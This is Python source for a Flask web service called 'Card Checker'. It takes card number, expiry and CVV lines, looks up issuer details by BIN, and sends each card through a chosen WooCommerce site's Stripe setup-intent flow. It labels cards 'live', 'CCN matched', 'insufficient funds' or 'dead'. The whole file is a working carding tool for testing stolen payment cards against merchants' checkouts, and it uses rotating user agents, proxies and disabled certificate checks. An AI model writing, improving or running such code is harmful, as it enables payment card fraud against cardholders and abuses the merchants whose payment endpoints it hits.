from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import requests
import re
import uuid
import random
import urllib3
import os
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
CORS(app)

# Configuration
CONFIG = {
    "stripe_url": "https://api.stripe.com/v1/payment_methods",
    "retry_count": 3,
    "retry_delay": 2,
}

def generate_user_agent():
    """Generate random user agent"""
    return random.choice([
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    ])

def get_card_info(card_number, handyapi_key=None):
    """Get card information from BIN"""
    info = {
        'brand': 'Unknown',
        'type': 'Unknown',
        'country': 'Unknown',
        'flag': '🌍',
        'bank': 'Unknown',
        'level': 'Unknown'
    }
    bin_number = card_number[:6]
    
    # Try HandyAPI first
    if handyapi_key:
        try:
            response = requests.get(
                f"https://data.handyapi.com/bin/{bin_number}",
                headers={'x-api-key': handyapi_key, 'User-Agent': 'Mozilla/5.0'},
                timeout=10,
                verify=False
            )
            if response.status_code == 200:
                data = response.json()
                if data.get('Scheme'):
                    info['brand'] = str(data['Scheme']).upper()
                if data.get('Type'):
                    info['type'] = str(data['Type']).title()
                if data.get('Category'):
                    info['level'] = str(data['Category']).title()
                elif data.get('CardTier'):
                    info['level'] = str(data['CardTier']).title()
                if data.get('Issuer'):
                    info['bank'] = str(data['Issuer']).title()
                
                country_data = data.get('Country')
                if country_data and isinstance(country_data, dict):
                    if country_data.get('Name'):
                        info['country'] = country_data['Name'].upper()
                    if country_data.get('A2') and len(country_data['A2']) == 2:
                        info['flag'] = ''.join(chr(127397 + ord(c)) for c in country_data['A2'].upper())
                
                if info['bank'] != 'Unknown' and info['country'] != 'Unknown':
                    return info
        except:
            pass
    
    # Fallback to BinList
    try:
        response = requests.get(
            f"https://lookup.binlist.net/{bin_number}",
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
            timeout=10,
            verify=False
        )
        if response.status_code == 200:
            data = response.json()
            if data.get('scheme'):
                info['brand'] = data['scheme'].upper()
            if data.get('type'):
                info['type'] = data['type'].title()
            if data.get('brand'):
                info['level'] = data['brand'].title()
            if data.get('bank', {}).get('name'):
                info['bank'] = data['bank']['name'].title()
            if data.get('country', {}).get('name'):
                info['country'] = data['country']['name'].upper()
            if data.get('country', {}).get('alpha2') and len(data['country']['alpha2']) == 2:
                info['flag'] = ''.join(chr(127397 + ord(c)) for c in data['country']['alpha2'].upper())
    except:
        pass
    
    # Basic brand detection
    if card_number[0] == '4':
        info['brand'], info['type'] = 'VISA', 'Credit'
    elif card_number[:2] in ['51', '52', '53', '54', '55']:
        info['brand'], info['type'] = 'MASTERCARD', 'Credit'
    elif card_number[:2] in ['34', '37']:
        info['brand'], info['type'] = 'AMERICAN EXPRESS', 'Credit'
    
    return info

def luhn_check(card_number):
    """Validate card number using Luhn algorithm"""
    digits = [int(d) for d in str(card_number)]
    checksum = sum(digits[-1::-2]) + sum(sum([int(d) for d in str(d * 2)]) for d in digits[-2::-2])
    return checksum % 10 == 0

class CardChecker:
    def __init__(self, api_url, proxy=None):
        self.api_url = api_url
        self.proxy = proxy
        self.uuids = {
            "gu": str(uuid.uuid4()),
            "mu": str(uuid.uuid4()),
            "si": str(uuid.uuid4())
        }
        self.headers = {
            'user-agent': generate_user_agent(),
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
        }
        self.session = requests.Session()
    
    def fetch_nonce_and_key(self):
        """Fetch nonce and Stripe key from gateway"""
        for attempt in range(CONFIG['retry_count']):
            try:
                proxies = {'http': self.proxy, 'https': self.proxy} if self.proxy else None
                response = self.session.get(
                    self.api_url,
                    headers=self.headers,
                    proxies=proxies,
                    verify=False,
                    timeout=30
                )
                if response.status_code == 200:
                    nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', response.text)
                    key_match = re.search(r'"key":"(pk_[^"]+)"', response.text)
                    if nonce_match and key_match:
                        return nonce_match.group(1), key_match.group(1)
            except:
                pass
        return None, None
    
    def validate_card(self, card, handyapi_key=None):
        """Validate card through Stripe"""
        try:
            parts = card.replace(' ', '').split('|')
            if len(parts) != 4:
                return {'status': 'error', 'message': 'Invalid format', 'icon': '❌'}
            
            number, exp_month, exp_year, cvv = parts
            
            if not number.isdigit() or len(number) < 13 or len(number) > 19:
                return {'status': 'error', 'message': 'Invalid card number', 'icon': '❌'}
            
            card_info = get_card_info(number, handyapi_key)
            
            if not luhn_check(number):
                return {'status': 'error', 'message': 'Invalid card (Luhn failed)', 'icon': '❌', 'card_info': card_info}
            
            if len(exp_year) == 4:
                exp_year = exp_year[-2:]
        except Exception as e:
            return {'status': 'error', 'message': f'Parse error: {str(e)}', 'icon': '❌'}
        
        # Fetch nonce and key
        nonce, key = self.fetch_nonce_and_key()
        if not nonce or not key:
            return {'status': 'error', 'message': 'Failed to fetch gateway data', 'icon': '❌', 'card_info': card_info}
        
        # Create Stripe payment method
        stripe_data = {
            'type': 'card',
            'card[number]': number,
            'card[cvc]': cvv,
            'card[exp_year]': exp_year,
            'card[exp_month]': exp_month,
            'guid': self.uuids["gu"],
            'muid': self.uuids["mu"],
            'sid': self.uuids["si"],
            'key': key,
            '_stripe_version': '2024-06-20',
        }
        
        try:
            proxies = {'http': self.proxy, 'https': self.proxy} if self.proxy else None
            stripe_response = self.session.post(
                CONFIG["stripe_url"],
                headers=self.headers,
                data=stripe_data,
                proxies=proxies,
                verify=False,
                timeout=30
            )
            
            if stripe_response.status_code != 200:
                error_msg = stripe_response.json().get('error', {}).get('message', 'Stripe error')
                return {'status': 'dead', 'message': f'Card Declined - {error_msg}', 'icon': '❌', 'card_info': card_info}
            
            payment_method_id = stripe_response.json().get('id')
            if not payment_method_id:
                return {'status': 'error', 'message': 'No payment method ID', 'icon': '❌', 'card_info': card_info}
        except Exception as e:
            return {'status': 'error', 'message': f'Stripe error: {str(e)}', 'icon': '❌', 'card_info': card_info}
        
        # Confirm setup intent
        setup_data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }
        
        try:
            confirm_response = self.session.post(
                self.api_url,
                params={'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'},
                headers=self.headers,
                data=setup_data,
                proxies=proxies,
                verify=False,
                timeout=30
            )
            
            response_text = confirm_response.text
            try:
                response_json = confirm_response.json()
            except:
                response_json = {}
            
            # Check response
            if response_json.get('success', False):
                return {'status': 'live', 'message': 'Card Live ✨', 'icon': '✅', 'card_info': card_info, 'card': card}
            
            if "security code is incorrect" in response_text.lower() or "incorrect_cvc" in response_text.lower():
                return {'status': 'live_cvc', 'message': 'CCN Matched (Invalid CVC)', 'icon': '⚠️', 'card_info': card_info, 'card': card}
            
            if "insufficient funds" in response_text.lower():
                return {'status': 'insufficient', 'message': 'Insufficient Funds', 'icon': '💰', 'card_info': card_info, 'card': card}
            
            error_msg = response_json.get('data', {}).get('error', {}).get('message', 'Card Declined')
            return {'status': 'dead', 'message': error_msg, 'icon': '❌', 'card_info': card_info}
        except Exception as e:
            return {'status': 'error', 'message': f'Error: {str(e)}', 'icon': '❌', 'card_info': card_info}

@app.route('/', methods=['GET', 'HEAD'])
def index():
    return render_template('index.html')

@app.route('/health', methods=['GET', 'HEAD'])
def health():
    return jsonify({'status': 'ok', 'message': 'Card Checker is running'}), 200

@app.route('/api/check', methods=['POST'])
def check_card():
    data = request.json
    card = data.get('card')
    api_url = data.get('api_url')
    handyapi_key = data.get('handyapi_key')
    proxy = data.get('proxy')
    
    if not card or not api_url:
        return jsonify({'error': 'Card and API URL required'}), 400
    
    checker = CardChecker(api_url, proxy)
    result = checker.validate_card(card, handyapi_key)
    return jsonify(result)

@app.route('/api/bin', methods=['POST'])
def bin_lookup():
    data = request.json
    bin_number = data.get('bin')
    handyapi_key = data.get('handyapi_key')
    
    if not bin_number or len(bin_number) < 6:
        return jsonify({'error': 'Valid BIN required'}), 400
    
    info = get_card_info(bin_number + '0000000000', handyapi_key)
    return jsonify(info)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)